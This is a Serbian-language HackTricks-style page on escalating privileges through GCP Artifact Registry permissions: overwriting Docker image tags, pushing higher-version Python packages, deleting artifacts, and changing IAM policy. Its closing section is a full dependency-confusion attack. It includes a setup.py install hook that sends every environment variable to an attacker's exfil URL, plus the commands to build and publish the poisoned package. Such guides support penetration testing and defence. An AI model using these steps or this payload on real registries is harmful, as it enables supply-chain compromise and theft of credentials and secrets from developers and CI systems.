# GCP - Artifact Registry Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Artifact Registry

Za više informacija o Artifact Registry pogledajte:

{{#ref}}
../gcp-services/gcp-artifact-registry-enum.md
{{#endref}}

### artifactregistry.repositories.uploadArtifacts

Sa ovom dozvolom napadač može otpremiti nove verzije artefakata sa zlonamernim kodom, npr. Docker images:

<details>
<summary>Otpremi Docker image u Artifact Registry</summary>
```bash
# Configure docker to use gcloud to authenticate with Artifact Registry
gcloud auth configure-docker <location>-docker.pkg.dev

# tag the image to upload it
docker tag <local-img-name>:<local-tag> <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>

# Upload it
docker push <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>
```
</details>

> [!CAUTION]
> Provereno je da je **moguće otpremiti novu malicioznu docker** image sa istim imenom i tagom kao ona koja već postoji, pa će **stara će izgubiti tag** i sledeći put kada se slika sa tim tagom bude preuzeta biće preuzeta **maliciozna**.

<details>

<summary>Otpremanje Python biblioteke</summary>

**Počnite pravljenjem biblioteke koju ćete otpremiti** (ako možete da preuzmete najnoviju verziju iz registry možete izbeći ovaj korak):

1.  **Podesite strukturu projekta**:

- Kreirajte novi direktorijum za vašu biblioteku, npr., `hello_world_library`.
- Unutar tog direktorijuma kreirajte još jedan direktorijum sa imenom paketa, npr., `hello_world`.
- Unutar direktorijuma paketa kreirajte fajl `__init__.py`. Ovaj fajl može biti prazan ili može sadržati inicijalizacije za vaš paket.

<details>
<summary>Create project structure</summary>

```bash
mkdir hello_world_library
cd hello_world_library
mkdir hello_world
touch hello_world/__init__.py
```

</details>

2.  **Napišite kod vaše biblioteke**:

- Unutar direktorijuma `hello_world` kreirajte novi Python fajl za vaš modul, npr., `greet.py`.
- Napišite vašu "Hello, World!" funkciju:

<details>
<summary>Create library module</summary>

```python
# hello_world/greet.py
def say_hello():
return "Hello, World!"
```

</details>

3.  **Kreirajte fajl `setup.py`**:

- U korenu vašeg `hello_world_library` direktorijuma kreirajte fajl `setup.py`.
- Ovaj fajl sadrži metapodatke o vašoj biblioteci i govori Pythonu kako da je instalira.

<details>
<summary>Create setup.py file</summary>

```python
# setup.py
from setuptools import setup, find_packages

setup(
name='hello_world',
version='0.1',
packages=find_packages(),
install_requires=[
# Any dependencies your library needs
],
)
```

</details>

**Sada, otpremimo biblioteku:**

1.  **Sastavite paket**:

- Iz korena vašeg `hello_world_library` direktorijuma pokrenite:

<details>
<summary>Build Python package</summary>

```sh
python3 setup.py sdist bdist_wheel
```

</details>

2.  **Konfigurišite autentifikaciju za twine** (koji se koristi za otpremanje vašeg paketa):
- Uverite se da imate instaliran `twine` (`pip install twine`).
- Koristite `gcloud` da konfigurišete kredencijale:

<details>
<summary>Upload package with twine</summary>
```sh
twine upload --username 'oauth2accesstoken' --password "$(gcloud auth print-access-token)" --repository-url https://<location>-python.pkg.dev/<project-id>/<repo-name>/ dist/*
```
</details>

3. **Očistite build**

<details>
<summary>Očistite build artifacts</summary>
```bash
rm -rf dist build hello_world.egg-info
```
</details>

</details>

> [!CAUTION]
> Nije moguće otpremiti python biblioteku sa istom verzijom kao ona koja je već prisutna, ali je moguće otpremiti **veće verzije** (ili dodati dodatno **`.0` na kraju** verzije ako to funkcioniše -ne u pythonu-), ili da **obrišete poslednju verziju i otpremite novu sa** (potrebno `artifactregistry.versions.delete)`**:**

<details>
<summary>Delete artifact version</summary>

```sh
gcloud artifacts versions delete <version> --repository=<repo-name> --location=<location> --package=<lib-name>
```

</details>

### `artifactregistry.repositories.downloadArtifacts`

Sa ovom dozvolom možete **preuzimati artefakte** i tražiti **osetljive informacije** i **ranjivosti**.

Preuzmite **Docker** image:

<details>
<summary>Preuzimanje Docker image-a iz Artifact Registry</summary>
```sh
# Configure docker to use gcloud to authenticate with Artifact Registry
gcloud auth configure-docker <location>-docker.pkg.dev

# Dowload image
docker pull <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>
```
</details>

Preuzmite **python** biblioteku:

<details>
<summary>Preuzmite Python biblioteku iz Artifact Registry</summary>
```bash
pip install <lib-name> --index-url "https://oauth2accesstoken:$(gcloud auth print-access-token)@<location>-python.pkg.dev/<project-id>/<repo-name>/simple/" --trusted-host <location>-python.pkg.dev --no-cache-dir
```
</details>

- Šta se dešava ako su udaljeni i standardni registri pomešani u virtualnom registru i paket postoji u oba? Pogledaj ovu stranicu:

{{#ref}}
../gcp-persistence/gcp-artifact-registry-persistence.md
{{#endref}}

### `artifactregistry.tags.delete`, `artifactregistry.versions.delete`, `artifactregistry.packages.delete`, (`artifactregistry.repositories.get`, `artifactregistry.tags.get`, `artifactregistry.tags.list`)

Briše artefakte iz registrija, kao što su docker images:

<details>
<summary>Obriši Docker image iz Artifact Registry</summary>
```bash
# Delete a docker image
gcloud artifacts docker images delete <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>
```
</details>

### `artifactregistry.repositories.delete`

Obriši ceo Artifact Registry repozitorijum (čak i ako ima sadržaj):

<details>
<summary>Obriši Artifact Registry repozitorijum</summary>
```
gcloud artifacts repositories delete <repo-name> --location=<location>
```
</details>

### `artifactregistry.repositories.setIamPolicy`

Napadač sa ovom dozvolom može sebi dodeliti prava potrebna za izvođenje nekih od prethodno pomenutih napada na repository.

### Pivoting to other Services through Artifact Registry Read & Write

- **Cloud Functions**

Kada se kreira Cloud Function, novi docker image se gura u Artifact Registry projekta. Pokušao sam da zamenim image novim, pa čak i da obrišem trenutni image (i `cache` image) i ništa se nije promenilo — Cloud Function je nastavila da radi. Dakle, možda bi bilo moguće zloupotrebiti Race Condition attack, kao kod bucket-a, da se promeni docker container koji će biti pokrenut, ali samo modifikovanje sačuvanog image-a nije dovoljno da kompromituje Cloud Function.

- **App Engine**

Iako App Engine kreira docker images u okviru Artifact Registry, testirano je da čak i ako izmenite image unutar ovog servisa i uklonite App Engine instance (tako da se postavi nova), izvršeni kod se ne menja.\
Moguće je da izvođenjem Race Condition attack kao kod bucket-ova može biti moguće prepisati izvršeni kod, ali to nije testirano.


### `artifactregistry.repositories.update`
Napadaču nisu potrebna specifična Artifact Registry prava da bi iskoristio ovaj problem — dovoljan je ranjiv virtual-repository konfiguracija. Do toga dolazi kada virtuelni repository kombinuje udaljeni javni repository (npr. PyPI, npm) sa internim, a udaljeni izvor ima istu ili veću prioritet. Ako oba sadrže paket istog imena, sistem bira najvišu verziju. Napadaču je dovoljno da zna ime internog paketa i da može da objavljuje pakete na odgovarajući javni registry.

Sa `artifactregistry.repositories.update` dozvolom, napadač može promeniti upstream podešavanja virtuelnog repository-ja da namerno kreira ovu ranjivu konfiguraciju i iskoristi Dependency Confusion kao metodu za persistenciju ubacivanjem zlonamernih paketa koje developeri ili CI/CD sistemi mogu automatski instalirati.

Napadač kreira zlonamernu verziju internog paketa u javnom repository-ju sa većim brojem verzije. Za Python pakete to podrazumeva pripremu strukture paketa koja oponaša legitimnu.
```bash
mkdir /tmp/malicious_package
cd /tmp/malicious_package
PACKAGE_NAME="<package-name>"
mkdir "$PACKAGE_NAME"
touch "$PACKAGE_NAME/__init__.py"
```
Zatim se kreira fajl setup.py koji sadrži maliciozni kod koji će se izvršiti tokom instalacije. Ovaj fajl mora da navede broj verzije veći od onog u privatnom repozitorijumu.
```bash
cat > setup.py << 'EOF'
import setuptools
from setuptools.command.install import install
import os
import urllib.request
import urllib.parse

def malicious_function():
data = dict(os.environ)
encoded_data = urllib.parse.urlencode(data).encode()
url = 'https://<ip-atacante>/exfil'
req = urllib.request.Request(url, data=encoded_data)
urllib.request.urlopen(req)

class AfterInstall(install):
def run(self):
install.run(self)
malicious_function()

setuptools.setup(
name = "<package-name>",
version = "0.1.1",
packages = ["<package-name>"],
cmdclass={'install': AfterInstall},
)
EOF
```
Izgradite paket i uklonite wheel kako biste osigurali da se code izvrši tokom instalacije.
```bash
python3 setup.py sdist bdist_wheel
rm dist/<package-name>*.whl
```
Otpremite zlonamerni paket u javni repozitorijum (na primer, test.pypi.org za Python).
```bash
pip install twine
twine upload --repository testpypi dist/*
```
Kada sistem ili servis instalira paket koristeći virtualni repozitorijum, preuzeće zlonamernu verziju sa javnog repozitorijuma umesto legitimne interne, zato što je zlonamerna verzija viša i udaljeni repozitorijum ima jednak ili viši prioritet.

{{#include ../../../banners/hacktricks-training.md}}
